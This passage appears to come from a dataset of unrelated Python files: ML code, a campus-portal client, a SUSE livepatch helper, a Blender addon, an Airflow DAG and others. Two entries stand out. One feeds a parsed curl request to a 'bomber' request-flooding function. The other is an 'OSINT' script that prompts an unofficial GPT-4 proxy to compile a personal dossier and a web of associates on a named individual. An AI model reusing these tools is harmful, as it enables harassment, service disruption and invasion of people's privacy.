self.compute_eds(threshold, dim)\n            elif metric == 'SEDI':\n                threshold = thresholds.get('SEDI', 0.5)\n                metric_values[metric] = self.compute_sedi(threshold, dim)\n            elif metric == 'RPSS':\n                threshold = thresholds.get('RPSS', 0.5)\n                metric_values[metric] = self.compute_rpss(threshold, dim)\n            elif metric == 'TSE':\n                metric_values[metric] = self.compute_tse(dim)\n            elif metric == 'EVS':\n                metric_values[metric] = self.compute_evs(dim)\n            elif metric == 'NMSE':\n                metric_values[metric] = self.compute_nmse(dim)\n    ",
    "import curlparser\nfrom bomber import bomber\nfrom urllib.parse import urlparse, parse_qsl\n\n\ndef process(text):\n    text = text.replace(\"--compressed\", \"\")\n\n    result = curlparser.parse(text)\n\n    parsed = urlparse(result.url)\n    args = parse_qsl(parsed.query)\n\n    headers = {}\n\n    json_data = {\n        \"method\": result.method,\n        \"url\": result.url,\n        \"headers\": headers,\n    }\n\n    if args:\n        json_data[\"url\"] = f\"{parsed.scheme}://{parsed.netloc}{parsed.path}\"\n        json_data[\"params\"] = {k: v for k, v in args}\n\n    if result.header:\n        headers = {k.lower(): v.strip() for k, v in result.header.items()}\n        \n        json_data[\"headers\"].update(headers)\n\n        if \"user-agent\" in headers:\n            del headers[\"user-agent\"]\n\n    if result.data:\n        content_type = headers.get(\"content-type\", \"\").strip()\n        if content_type.startswith(\"application/x-www-form-urlencoded\"):\n            json_data[\"data\"] = dict(parse_qsl(result.data))\n        else:\n            json_data[\"json\"] = result.data\n\n    return json_data\n\n\ndef main():\n    print(\"Enter request data: (Press Ctrl+D (on Linux/Mac) or Ctrl+Z (on Windows) to finish input)\")\n\n    user_input = []\n    try:\n        while True:\n            user_input.append(input())\n    except EOFError:\n        pass\n\n    data = process('\\n'.join(user_input))\n    bomber(data)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import torch\nimport torch.nn as nn\n\n\nclass VAENet(nn.Module):\n\n    class Sampler(nn.Module):\n\n        def forward(self, m, gamma):\n            return torch.randn_like(m) * torch.exp(gamma / 2) + m        \n    \n    def __init__(self, latent_dim : int = 10) -> None:\n        super().__init__()\n\n        self.act = nn.ReLU()\n\n        self.input_layer = nn.Linear(784, 256)\n        self.encoder_hidden = nn.Linear(256, 100)\n        self.mean_layer = nn.Linear(100, latent_dim)\n        self.gamma_layer = nn.Linear(100, latent_dim)\n\n        self.sampler = VAENet.Sampler()\n\n        self.initial_decoder = nn.Linear(latent_dim, 100)\n        self.hidden_decoder = nn.Linear(100, 256)\n        self.final_decoder = nn.Linear(256, 784)\n\n        \n    \n    def forward(self, x):\n        x = self.act(self.input_layer(x))\n        x = self.act(self.encoder_hidden(x))\n        \n        m = self.mean_layer(x)\n        gamma = self.gamma_layer(x)\n\n        x = self.sampler(m, gamma)\n\n        x = self.act(self.initial_decoder(x))\n        x = self.act(self.hidden_decoder(x))\n        x = self.final_decoder(x)\n        \n        return x, m, gamma\n    \n\n    def decode(self, x):\n\n        x = self.act(self.initial_decoder(x))\n        x = self.act(self.hidden_decoder(x))\n        x = self.final_decoder(x)\n        \n        return x",
    "import re\nfrom abc import abstractmethod\nfrom datetime import datetime, timedelta\nfrom typing import TYPE_CHECKING, List, Optional\n\nfrom bs4 import BeautifulSoup\n\nfrom ecjtu.constants import (\n    GET_CLASSES_URL,\n    GET_ELERTIVE_COURSE_URL_TEMPLATE,\n    GET_GPA_URL,\n)\nfrom ecjtu.models import GPA, ElectiveCourse, ScheduledCourse, Score\nfrom ecjtu.utils import (\n    get_cur_semester,\n    get_cur_week_datetime,\n    get_last_semester,\n    get_today_date,\n)\nfrom ecjtu.utils.logger import logger\n\nif TYPE_CHECKING:\n    from ecjtu.client import ECJTU, AsyncECJTU\n\n\nclass CRUDClient:\n    \"\"\"\n    CRUD mixin for resources. This class provides basic CRUD operations for resources.\n    \"\"\"\n\n    def __init__(self, client: \"ECJTU\"):\n        self.client: \"ECJTU\" = client\n        self.cache: dict = {}\n\n    @abstractmethod\n    def today(self, *args, **kwargs):\n        raise NotImplementedError\n\n    @abstractmethod\n    def filter(self, *args, **kwargs):\n        raise NotImplementedError\n\n\nclass AsyncCRUDClient:\n    \"\"\"\n    CRUD mixin for resources. This class provides basic CRUD operations for resources.\n    \"\"\"\n\n    def __init__(self, client: \"AsyncECJTU\"):\n        self.client: AsyncECJTU = client\n        self.cache: dict = {}\n\n    @abstractmethod\n    async def today(self, *args, **kwargs):\n        raise NotImplementedError\n\n    @abstractmethod\n    async def filter(self, *args, **kwargs):\n        raise NotImplementedError\n\n\nclass ScheduledCourseCRUD(CRUDClient):\n    def _fetch_courses(self, date: str) -> List[ScheduledCourse]:\n        \"\"\"Fetch courses by date\n\n        Args:\n            date(str): The date to fetch, eg: 2023-01-01\n\n        Returns:\n            List[ScheduledCourse]: List of courses\n        \"\"\"\n        resp = self.client.post(GET_CLASSES_URL, data={\"date\": date})\n\n        _ = resp.json().get(\"weekcalendarpojoList\", [])\n        return list(ScheduledCourse.model_validate(cls) for cls in _)\n\n    def filter(self, *, date: str) -> List[ScheduledCourse]:\n        \"\"\"Filter courses by date\n\n        Args:\n            date(str): The date to filter, eg: 2023-01-01\n\n        Returns:\n            List[ElectiveCourse]: List of courses\n        \"\"\"\n        return self._fetch_courses(date)\n\n    def today(self) -> List[ScheduledCourse]:\n        \"\"\"Get today's classes\n\n        Returns:\n            List[ElectiveCourse]: List of courses\n        \"\"\"\n        date: str = get_today_date()\n        return self._fetch_courses(date)\n\n    def this_week(self) -> List[List[ScheduledCourse]]:\n        \"\"\"Get this week's classes\n\n        Returns:\n            List[List[ElectiveCourse]]: List of courses\n        \"\"\"\n        start_datetime: datetime = get_cur_week_datetime()\n        week_classes: List[List[ScheduledCourse]] = []\n\n        for i in range(7):\n            date: str = (start_datetime + timedelta(days=i)).strftime(\"%Y-%m-%d\")\n            week_classes.append(self._fetch_courses(date))\n\n        return week_classes\n\n\nclass AsyncScheduledCourseCRUD(AsyncCRUDClient):\n    async def _fetch_courses(self, date: str) -> List[ScheduledCourse]:\n        \"\"\"Fetch courses by date\n\n        Args:\n            date(str): The date to fetch, eg: 2023-01-01\n\n        Returns:\n            List[ScheduledCourse]: List of courses\n        \"\"\"\n        resp = await self.client.post(GET_CLASSES_URL, data={\"date\": date})\n\n        _ = resp.json().get(\"weekcalendarpojoList\", [])\n        return list(ScheduledCourse.model_validate(cls) for cls in _)\n\n    async def filter(self, *, date: str) -> List[ScheduledCourse]:\n        \"\"\"Filter courses by date\n\n        Args:\n            date(str): The date to filter, eg: 2023-01-01\n\n        Returns:\n            List[ElectiveCourse]: List of courses\n        \"\"\"\n        return await self._fetch_courses(date)\n\n    async def today(self) -> List[ScheduledCourse]:\n        \"\"\"Get today's classes\n\n        Returns:\n            List[ElectiveCourse]: List of courses\n        \"\"\"\n        date: str = get_today_date()\n        return await self._fetch_courses(date)\n\n    async def this_week(self) -> List[List[ScheduledCourse]]:\n        \"\"\"Get this week's classes\n\n        Returns:\n            List[List[ElectiveCourse]]: List of courses\n        \"\"\"\n        start_datetime: datetime = get_cur_week_datetime()\n        week_classes: List[List[ScheduledCourse]] = []\n\n        for i in range(7):\n            date: str = (start_datetime + timedelta(days=i)).strftime(\"%Y-%m-%d\")\n            week_classes.append(await self._fetch_courses(date))\n\n        return week_classes\n\n\nclass GPACRUD(CRUDClient):\n    def today(self) -> GPA:\n        \"\"\"Get current GPA\n\n        Returns:\n            GPA: GPA model\n        \"\"\"\n        resp_html = self.client.get(GET_GPA_URL)\n\n        if resp_html.status_code != 200:\n            raise Exception(f\"Failed to get GPA, status code: {resp_html.status_code}\")\n\n        soup = BeautifulSoup(resp_html.text, \"html.parser\")\n        data = [td.text for td in soup.find_all(\"tr\")[3].find_all(\"td\")]\n        return GPA.model_validate(\n            ",
    "import tkinter as tk\r\nfrom tkinter import simpledialog\r\n# pip install duckduckgo_search\r\nfrom duckduckgo_search import DDGS\r\n# pip install -U g4f\r\nfrom g4f.client import Client\r\nfrom g4f.Provider import OpenaiChat\r\nimport requests, json\r\nimport sys\r\nimport os\r\n\r\nsys.stderr = open(os.devnull, 'w')\r\n\r\nclass OSINT(simpledialog.Dialog):\r\n    def body(self, master):\r\n        tk.Label(master, text=\"Query:\").grid(row=0)\r\n        tk.Label(master, text=\"Any other information:\").grid(row=1)\r\n        tk.Label(master, text=\"Do you want to trawl for images? (beta testing) y/n: \").grid(row=2)\r\n        tk.Label(master, text=\"Input your email address: \").grid(row=3)\r\n\r\n        self.e0 = tk.Entry(master)\r\n        self.e1 = tk.Entry(master)\r\n        self.e2 = tk.Entry(master)\r\n        self.e3 = tk.Entry(master)\r\n\r\n        self.e0.grid(row=0, column=1)\r\n        self.e1.grid(row=1, column=1)\r\n        self.e2.grid(row=2, column=1)\r\n        self.e3.grid(row=3, column=1)\r\n\r\n    def apply(self):\r\n        self.result = (\r\n            self.e0.get(),\r\n            self.e1.get(),\r\n            self.e2.get(),\r\n            self.e3.get(),\r\n        )\r\n\r\n# global variables\r\nfinalpayload = \"\"\r\nstorenum = 0\r\nstoremsg = \"\"\r\nstoremsg = \"\"\r\n\r\ndef payload_gen(word, add, img):\r\n    new = '\"' + word + '\"'\r\n\r\n    if img == \"y\":\r\n        results = DDGS().text(new, max_results=25)\r\n        images = DDGS().images(new, region=\"sg-en\", max_results=25)\r\n    else:\r\n        results = DDGS().text(new, max_results=50)\r\n    global finalpayload\r\n    payload = f\"If I gave you some information on someone, could you write me a comprehensive report on them that is as detailed as possible?\"\r\n    payload += f\" Do note that the person's name is, {word}. Perhaps you could also create a web of people relating to {word} and provide ANY and ALL links where the information can be found.\"\r\n    payload += \"Do also see if you can extract basic information such as past and current education statuses, location and information from ANY accounts like their username or email.\"\r\n    payload += f\"Lastly, also note that {add}  Here is the data with links (to be included): \\n.\"\r\n    gptstring = \"\"\r\n    refgptstr = \"\"\r\n    if img == \"y\":\r\n        for x in results:\r\n            gptstring += ' '\r\n            gptstring += str(x)\r\n\r\n        for x in images:\r\n            refgptstr += ' '\r\n            refgptstr += str(x)\r\n\r\n        payload += \" Data: \" + gptstring\r\n        payloadimg = f\" Now, with the above data, I will provide you with some image links relating to {word}.\"\r\n        payloadimg += f\" Do filter through all the data and give me ANY relevant links. Here is the data: {refgptstr}.\"\r\n        finalpayload += payload + \" \" + payloadimg\r\n    else:\r\n        for x in results:\r\n            gptstring += ' '\r\n            gptstring += str(x)\r\n\r\n        payload += \" Data: \" + gptstring\r\n        finalpayload += payload\r\n\r\ndef chat(finalpayload, storemsg):\r\n    client = Client(provider=OpenaiChat)\r\n    storemsg = client.chat.completions.create(\r\n        model = \"gpt-4\",\r\n        messages=[{\"role\": \"user\", \"content\": finalpayload}]\r\n    )\r\n    print(storemsg.choices[0].message.content) \r\n\r\ndef email_address(email):\r\n  url = \"https://webapi.namescan.io/v1/freechecks/email/breaches\"\r\n\r\n  payload={\r\n      \"email\": email\r\n  }\r\n  headers = {\r\n      'Content-Type': 'application/json'\r\n  }\r\n  response = requests.post(url, headers=headers, data=json.dumps(payload))\r\n  print(response.text)\r\n\r\ndef main():\r\n    root = tk.Tk()\r\n    root.withdraw()  # Hide the root window\r\n    d = OSINT(root)\r\n    if d.result:  # Check if the dialog returned a result\r\n        word, add, img, email = d.result\r\n        # Runs the function in a separate thread\r\n        payload_gen(word, add, img)\r\n        chat(finalpayload, storemsg)\r\n        email_address(email)\r\n    else: \r\n        print(\"failed\")\r\n\r\nmain()\r\n\r\n# Special thanks to:\r\n# https://github.com/xtekky/gpt4free, for providing free gpt 4 api\r\n",
    "# SPDX-License-Identifier: GPL-2.0-only\n#\n# Copyright (C) 2021-2024 SUSE\n# Author: Marcos Paulo de Souza <mpdesouza@suse.com>\n\nimport os\nfrom pathlib import Path\n\nfrom klpbuild.config import Config\nfrom klpbuild.utils import ARCH\n\n\nclass CCP(Config):\n    def __init__(self, lp_name, lp_filter, avoid_ext):\n        super().__init__(lp_name, lp_filter)\n\n        self.env = os.environ\n\n        # Prefer the env var to the HOME directory location\n        ccp_path = os.getenv(\"KLP_CCP_PATH\", \"\")\n        if ccp_path and not Path(ccp_path).is_file():\n            raise RuntimeError(\"KLP_CCP_PATH does not point to a file\")\n\n        elif not ccp_path:\n            ccp_path = Path(Path().home(), \"kgr\", \"ccp\", \"build\", \"klp-ccp\")\n            if not ccp_path.exists():\n                raise RuntimeError(\n                    \"klp-ccp not found in ~/kgr/ccp/build/klp-ccp. Please set KLP_CCP_PATH env var to a valid klp-ccp binary\"\n                )\n\n        self.ccp_path = str(ccp_path)\n\n        pol_path = os.getenv(\"KLP_CCP_POL_PATH\")\n        if pol_path and not Path(pol_path).is_dir():\n            raise RuntimeError(\"KLP_CCP_POL_PATH does not point to a directory\")\n\n        elif not pol_path:\n            pol_path = Path(Path().home(), \"kgr\", \"scripts\", \"ccp-pol\")\n            if not pol_path.is_dir():\n                raise RuntimeError(\n                    \"ccp-pol not found at ~/kgr/scripts/ccp-pol/.  Please set KLP_CCP_POL_PATH env var to a valid ccp-pol directory\"\n                )\n\n        self.pol_path = str(pol_path)\n\n        # List of symbols that are currently not resolvable for klp-ccp\n        avoid_syms = [\n            \"__xadd_wrong_size\",\n            \"__bad_copy_from\",\n            \"__bad_copy_to\",\n            \"rcu_irq_enter_disabled\",\n            \"rcu_irq_enter_irqson\",\n            \"rcu_irq_exit_irqson\",\n            \"verbose\",\n            \"__write_overflow\",\n            \"__read_overflow\",\n            \"__read_overflow2\",\n            \"__real_strnlen\",\n            \"twaddle\",\n            \"set_geometry\",\n            \"valid_floppy_drive_params\",\n            \"__real_memchr_inv\",\n            \"__real_kmemdup\",\n            \"lockdep_rtnl_is_held\",\n            \"lockdep_rht_mutex_is_held\",\n            \"debug_lockdep_rcu_enabled\",\n            \"lockdep_rcu_suspicious\",\n            \"rcu_read_lock_bh_held\",\n            \"lock_acquire\",\n            \"preempt_count_add\",\n            \"rcu_read_lock_any_held\",\n            \"preempt_count_sub\",\n            \"lock_release\",\n            \"trace_hardirqs_off\",\n            \"trace_hardirqs_on\",\n            \"debug_smp_processor_id\",\n            \"lock_is_held_type\",\n            \"mutex_lock_nested\",\n            \"rcu_read_lock_held\",\n            \"__bad_unaligned_access_size\",\n            \"__builtin_alloca\",\n        ]\n        # The backlist tells the klp-ccp to always copy the symbol code,\n        # instead of externalizing. This helps in cases where different archs\n        # have different inline decisions, optimizing and sometimes removing the\n        # symbols.\n        if avoid_ext:\n            avoid_syms.extend(avoid_ext)\n\n        self.env[\"KCP_EXT_BLACKLIST\"] = \",\".join(avoid_syms)\n        self.env[\"KCP_READELF\"] = \"readelf\"\n        self.env[\"KCP_RENAME_PREFIX\"] = \"klp\"\n\n    # Generate the list of exported symbols\n    def get_symbol_list(self, out_dir):\n        exts = []\n\n        for ext_file in [\"fun_exts\", \"obj_exts\"]:\n            ext_path = Path(out_dir, ext_file)\n            if not ext_path.exists():\n                continue\n\n            with open(ext_path) as f:\n                for l in f:\n                    l = l.strip()\n                    if not l.startswith(\"KALLSYMS\"):\n                        continue\n\n                    _, sym, var, mod = l.split(\" \")\n                    if not self.is_mod(mod):\n                        mod = \"vmlinux\"\n\n                    exts.append((sym, var, mod))\n\n        exts.sort(key=lambda tup: tup[0])\n\n        # store the externalized symbols and module used in this codestream file\n        symbols = {}\n        for ext in exts:\n            sym, mod = ext[0], ext[2]\n            symbols.setdefault(mod, [])\n            symbols[mod].append(sym)\n\n        return symbols\n\n    def cmd_args(self, cs, fname, funcs, out_dir, fdata, cmd):\n        sdir = self.get_sdir(cs)\n        odir = self.get_odir(cs)\n\n        lp_name = self.lp_out_file(fname)\n        lp_out = Path(out_dir, lp_name)\n        ppath = self.pol_path\n\n        ccp_args = [self.ccp_path]\n        for arg in [\n            \"may-include-header\",\n            \"can-externalize-fun\",\n            \"shall-externalize-fun\",\n            \"shall-externalize-obj\",\n            \"modify-externalized-sym\",\n            \"rename-rewritten-fun\",\n        ]:\n            ccp_args.append(f\"--pol-cmd-{arg}={ppath}/kgr-ccp-pol-{arg}.sh\")\n\n        ccp_args.append(f\"--pol-cmd-modify-patched-fun-sym={ppath}/kgr-ccp-pol-modify-patched-sym.sh\")\n\n        ccp_args.extend([\"--compiler=x86_64-gcc-9.1.0\", \"-i\", f\"{funcs}\", \"-o\", f\"{str(lp_out)}\", \"--\"",
    "\nimport bpy\n\n\nclass QuaternionProceduralBonesPanel(bpy.types.Panel):\n    bl_category = \"qprocbones\"\n    bl_idname = \"VIEW_3D_PT_QuaternionProceduralBones\"\n    bl_label = \"Quaternion Procedural Bones\"\n    bl_region_type = \"UI\"\n    bl_space_type = \"VIEW_3D\"\n\n    @classmethod\n    def poll(cls, context: bpy.types.Context) -> bool:\n        return context.object and context.object.type == 'ARMATURE'\n\n    def draw(self, context: bpy.types.Context) -> None:\n        layout = self.layout\n        armature = context.object\n        procedural_bones = armature.procedural_bones\n\n        col = layout.column(align=True)\n        col.operator(\"qprocbones.add_quaternion_procedural\")\n\n        if not len(procedural_bones.quaternion_bones):\n            return\n\n        box = col.box()\n\n        for procedural_index, quaternion_procedural in enumerate(procedural_bones.quaternion_bones):\n            procedural_col = box.column(align=True)\n            procedural_name = quaternion_procedural.target_bone + \" - \" + quaternion_procedural.control_bone \\\n                if quaternion_procedural.target_bone and quaternion_procedural.control_bone \\\n                else \"Quaternion Procedural\"\n            procedural_col.prop(quaternion_procedural, \"reveal\", text=procedural_name,\n                                icon=\"TRIA_DOWN\" if quaternion_procedural.reveal else \"TRIA_RIGHT\")\n\n            if not quaternion_procedural.reveal:\n                continue\n\n            procedural_box = procedural_col.box()\n            procedural_col = procedural_box.column(align=True)\n            procedural_col.prop_search(quaternion_procedural, \"target_bone\", armature.pose, \"bones\", text=\"Target Bone\")\n            procedural_col.prop_search(quaternion_procedural, \"control_bone\", armature.pose, \"bones\",\n                                       text=\"Control Bone\")\n\n            if not valid_selected_procedural_bones(armature.pose.bones, quaternion_procedural.target_bone, quaternion_procedural.control_bone):\n                procedural_col = procedural_box.column(align=True)\n                remove_procedural = procedural_col.operator(\"qprocbones.remove_quaternion_procedural\", text=\"Remove\")\n                remove_procedural.procedural_index = procedural_index\n                continue\n\n            procedural_col = procedural_box.column(align=True)\n            add_trigger = procedural_col.operator(\"qprocbones.add_trigger\")\n            add_trigger.procedural_index = procedural_index\n\n            procedural_col = procedural_box.column(align=True)\n            procedural_col.prop(quaternion_procedural, \"reveal_triggers\", text=\"Triggers\",\n                                icon=\"TRIA_DOWN\" if quaternion_procedural.reveal_triggers else \"TRIA_RIGHT\")\n            if quaternion_procedural.reveal_triggers:\n                for trigger_index, trigger in enumerate(quaternion_procedural.triggers):\n                    trigger_box = procedural_col.box()\n                    trigger_col = trigger_box.column(align=True)\n                    trigger_name = trigger.name if trigger.name else \"Trigger\"\n                    trigger_col.prop(trigger, \"reveal\", text=trigger_name,\n                                     icon=\"TRIA_DOWN\" if trigger.reveal else \"TRIA_RIGHT\")\n\n                    if not trigger.reveal:\n                        continue\n\n                    trigger_row = trigger_col.row(align=True)\n                    trigger_up = trigger_row.operator(\"qprocbones.move_up_trigger\", icon=\"TRIA_UP\")\n                    trigger_up.procedural_index = procedural_index\n                    trigger_up.trigger_index = trigger_index\n\n                    trigger_down = trigger_row.operator(\n                        \"qprocbones.move_down_trigger\", icon=\"TRIA_DOWN\")\n                    trigger_down.procedural_index = procedural_index\n                    trigger_down.trigger_index = trigger_index\n\n                    trigger_col = trigger_box.column(align=True)\n                    trigger_col.prop(trigger, \"name\", text=\"Name\")\n\n                    trigger_col = trigger_box.column(align=True)\n                    trigger_col.prop(trigger, \"tolerance\", text=\"Tolerance\")\n\n                    trigger_row = trigger_col.row(align=True)\n                    trigger_row.prop(trigger, \"trigger_angle\", text=\"Trigger\")\n                    trigger_set = trigger_row.operator(\"qprocbones.set_trigger_angle\", text=\"Set\")\n                    trigger_set.procedural_index = procedural_index\n                    trigger_set.trigger_index = trigger_index\n\n                    trigger_row = trigger_col.row(align=True)\n                    trigger_row.prop(trigger, \"target_angle\", text=\"Angle\")\n                    trigger_set = trigger_row.operator(\"qprocbones.set_target_angle\", text=\"Set\")\n                    trigger_set.procedural_index = procedural_index\n                    trigger_set.trigger_index = trigger_index\n\n                    trigger_row = trigger_col.row(align=True)\n                    trigger_row.prop(trigger, \"target_posit",
    "\"\"\"\nIngest initial data as the basis of analysis\n- Actual power generation per generation unit data from a specified duration prior to current date (JSON to parquet)\n- Latest production capacity data per BM Unit (JSON to parquet)\n- Latest Power Plant Locations (CSV)\n- Power Plant ID Dictionary (CSV)\n- Fuel category mapping (CSV)\n\"\"\"\nfrom datetime import datetime, timedelta\nimport os\nimport sys\n\nfrom airflow import DAG\nfrom airflow.operators.bash import BashOperator\nfrom airflow.operators.python import PythonOperator\nfrom airflow.providers.google.cloud.operators.bigquery import BigQueryCreateExternalTableOperator, BigQueryInsertJobOperator\nfrom airflow.providers.apache.spark.operators.spark_submit import SparkSubmitOperator\n\ncurrent_file_path = os.path.abspath(__file__)\nparent_directory = os.path.dirname(os.path.dirname(current_file_path))\nsys.path.append(parent_directory)\n\nfrom common.file_config import *\nfrom common.bq_queries import *\nfrom gcp_operations import upload_multiple_files_to_gcs\nfrom ingest_bmrs_data import fetch_bmrs_data\nfrom ingest_mapping_data import transform_power_plant_id_mapping_callable, transform_power_plant_location_mapping_callable, \\\n    transform_bmrs_power_plant_info_mapping_callable\n\n\n# Configure Airflow\ndefault_args = {\n    'owner': 'airflow',\n    'depends_on_past': False,\n    'start_date': datetime.today(),\n    'email_on_failure': False,\n    'email_on_retry': False,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=5),\n}\n\n# Define workflow name, schedule and start date\nlocal_workflow = DAG(\n    'initialise_data',\n    schedule_interval='@once', # Only running once as initialisation\n    start_date=datetime.today()\n)\n\nwith local_workflow:\n    # TODO: check existing and fetch anything after latest data if already exists\n    \n    fetch_bmrs_generation_task = PythonOperator(\n        task_id='fetch_bmrs_generation',\n        python_callable=fetch_bmrs_data,\n        op_kwargs=dict(\n            url_template=bmrs_generation_url_template, \n            # request_from_datetime=initialise_bmrs_from_datetime,\n            request_from_datetime=initialise_bmrs_from_datetime,\n            request_to_datetime=initialise_bmrs_generation_to_datetime, \n            json_raw_output_path=initialise_bmrs_generation_json_raw_output_filepath\n        )\n    ) \n\n    fetch_bmrs_capacity_task = PythonOperator(\n        task_id='fetch_bmrs_capacity',\n        python_callable=fetch_bmrs_data,\n        op_kwargs=dict(\n            url_template=bmrs_capacity_url_template, \n            request_from_datetime=initialise_bmrs_capacity_from_datetime,\n            request_to_datetime=initialise_bmrs_capacity_to_datetime, \n            json_raw_output_path=initialise_bmrs_capacity_json_raw_output_filepath\n        )\n    ) \n    \n    spark_bmrs_generation_job = SparkSubmitOperator(\n        task_id=\"spark_transform_bmrs_generation\",\n        application=\"/opt/airflow/jobs/pyspark_transform_bmrs_generation.py\", # Spark application path created in airflow and spark cluster\n        name=\"spark-transform-bmrs-generation\",\n        conn_id=\"spark-conn\",\n        # total_executor_cores=4,\n        # executor_cores=2,\n        # executor_memory='10g',\n    )\n        \n    spark_bmrs_capacity_job = SparkSubmitOperator(\n        task_id=\"spark_transform_bmrs_capacity\",\n        application=\"/opt/airflow/jobs/pyspark_transform_bmrs_capacity.py\", # Spark application path created in airflow and spark cluster\n        name=\"spark-transform-bmrs-capacity\",\n        conn_id=\"spark-conn\",\n        # total_executor_cores=4,\n        # executor_cores=2,\n        # executor_memory='10g',\n    )\n    \n    curl_power_plant_mappings_task = BashOperator(\n        task_id='curl_power_plant_mappings', \n        bash_command=power_plant_mappings_download_command\n    )\n    \n    transform_power_plant_id_mapping_task = PythonOperator(\n        task_id='transform_power_plant_id',\n        python_callable=transform_power_plant_id_mapping_callable,\n        op_kwargs=dict(\n            raw_filepath=initialise_power_plant_id_raw_output_file, \n            output_filepath=initialise_power_plant_id_processed_output_file\n        )\n    )\n    \n    transform_power_plant_location_mapping_task = PythonOperator(\n        task_id='transform_power_plant_location',\n        python_callable=transform_power_plant_location_mapping_callable,\n        op_kwargs=dict(\n            raw_filepath=initialise_power_plant_location_raw_output_file, \n            output_filepath=initialise_power_plant_location_processed_output_file\n        )\n    )\n    \n    transform_bmrs_power_plant_info_task = PythonOperator(\n        task_id='transform_bmrs_power_plant_info',\n        python_callable=transform_bmrs_power_plant_info_mapping_callable,\n        op_kwargs=dict(\n            raw_filepath=bmrs_power_plant_info_raw_output_file, \n            output_filepath=bmrs_power_plant_info_processed_output_file\n        )\n    )    \n    \n    local_to_gcs_task = PythonOperator(\n        task_id='local_to_gcs_task',\n        python_callab",
    "# Copyright (c) 2021 - present / Neuralmagic, Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport pytest\nimport torch\nfrom compressed_tensors.quantization import (\n    QuantizationArgs,\n    QuantizationConfig,\n    QuantizationScheme,\n    QuantizationStatus,\n    apply_quantization_config,\n)\nfrom compressed_tensors.quantization.lifecycle.forward import fake_quantize\nfrom torch.nn import Linear\n\n\ndef create_config(bit_depth, input_symmetry, weight_symmetry):\n    weights = QuantizationArgs(num_bits=bit_depth, symmetric=weight_symmetry)\n    if input_symmetry is not None:\n        inputs = QuantizationArgs(num_bits=bit_depth, symmetric=input_symmetry)\n    else:\n        inputs = None\n\n    config_groups = {\n        \"group_1\": QuantizationScheme(\n            targets=[\"Linear\"], weights=weights, input_activations=inputs\n        )\n    }\n    config = QuantizationConfig(\n        config_groups=config_groups, quantization_status=QuantizationStatus.CALIBRATION\n    )\n    return config\n\n\n@torch.no_grad\n@pytest.mark.parametrize(\"bit_depth\", [4, 8])\n@pytest.mark.parametrize(\"input_symmetry\", [True, False, None])\n@pytest.mark.parametrize(\"weight_symmetry\", [True, False])\ndef test_bit_depths(bit_depth, input_symmetry, weight_symmetry):\n    model = Linear(64, 64)\n    quant_config = create_config(bit_depth, input_symmetry, weight_symmetry)\n    apply_quantization_config(model, quant_config)\n\n    min = -1 * int(2**bit_depth / 2)\n    max = int(2**bit_depth / 2) - 1\n\n    inputs = torch.randn(32, 64)\n    model(inputs)\n    if input_symmetry is not None:\n        assert model.input_zero_point >= min\n        assert model.input_zero_point <= max\n\n        input_max = torch.max(inputs)\n        input_min = torch.min(inputs)\n        diff_from_max = abs(\n            abs(model.input_scale * (max - model.input_zero_point)) - abs(input_max)\n        )\n        diff_from_min = abs(\n            abs(model.input_scale * abs(min - model.input_zero_point)) - abs(input_min)\n        )\n        assert diff_from_max < model.input_scale or diff_from_min < model.input_scale\n\n    assert model.weight_zero_point >= min\n    assert model.weight_zero_point <= max\n\n    weight_max = torch.max(model.weight)\n    weight_min = torch.min(model.weight)\n    diff_from_max = abs(\n        abs(model.weight_scale * (max - model.weight_zero_point)) - abs(weight_max)\n    )\n    diff_from_min = abs(\n        abs(model.weight_scale * abs(min - model.weight_zero_point)) - abs(weight_min)\n    )\n    assert diff_from_max < model.weight_scale or diff_from_min < model.weight_scale\n\n    quantized_weight = fake_quantize(\n        model.weight,\n        model.weight_scale,\n        model.weight_zero_point,\n        model.quantization_scheme.weights,\n    )\n    assert not torch.any(quantized_weight < min).item()\n    assert not torch.any(quantized_weight > max).item()\n",
    "\"\"\" an ai powered virtual mouse controlled using our finger tips \"\"\"\r\n\r\n# step 1:- capture the video frames using opencv\r\n\r\nimport cv2                                     # opencv2 is a module which is related to computer vision and helps us to do operations based upon a camera\r\n\r\n#step 2:- detect the hand from the frames captured\r\n\r\nimport mediapipe as mp                         # meadiapipe is an exterernal module which is powered by google for detetecting \r\n\r\n#step 3:- control the mouse using the index finger\r\n\r\nimport pyautogui                               # pyautogui is a module which helps with controlling the various aspects of the system and interact with them \r\n\r\ncap = cv2.VideoCapture(0)                      # this line starts to record the video from the camera 0 = front camera 1 = rear camera \r\n\r\nhand_detector = mp.solutions.hands.Hands()     # we are using the  mediapipe module to detect the hand from the frames \r\ndrawing_utils = mp.solutions.drawing_utils     # we are plotting out the landmarks of the hand\r\nscreen_width, screen_height = pyautogui.size() # taking out the screen size of the respective system \r\nindex_y = 0                                    # setting the initial position value of the top most part of the index finger \r\n\r\nwhile True:                                    # opening a continous loop for the capturing of the hand\r\n\r\n    _, frame = cap.read()                      # reading all the frames from the camera\r\n    frame = cv2.flip(frame, 1)                 # by default the opencv mirorrs the image infront of the cameea by giving the vakue 1 we are flipping the image read from the camera\r\n    frame_height, frame_width, _ = frame.shape # setting the up the frame size of the capture window\r\n    rgb_frmae = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) # converting the colour scale of the frames captured from RGB2BGR for the smoothness of processing the frames\r\n    output = hand_detector.process(rgb_frmae)  # passing the convert colour scales frames to the hand detector method tho detect the hands\r\n    hands = output.multi_hand_landmarks        # setting up the landmarks on the fingers of the hands\r\n    if hands:                                  # conditon statement for checking the presence of hand in the frame \r\n        for hand in hands:                     # a for loop to continously iterate and check for hand in the hands method \r\n            drawing_utils.draw_landmarks(frame, hand) # drawing the landmarks on each frame captuted from the capture window\r\n            landmarks = hand.landmark          # setting the value of the landmark points in the hand\r\n            for id,landmark in enumerate(landmarks): # for loop for giving position values to each landmark enumerate means to move through the whole landmarks in the hand\r\n                x = int(landmark.x*frame_width)      # adjusting the position values of the pointer landmark for x axis and called it as an integer to get a whole number \r\n                y = int(landmark.y*frame_height)     # adjusting the position values of the pointer landmark for y axis and called it also an integer to get a whole number    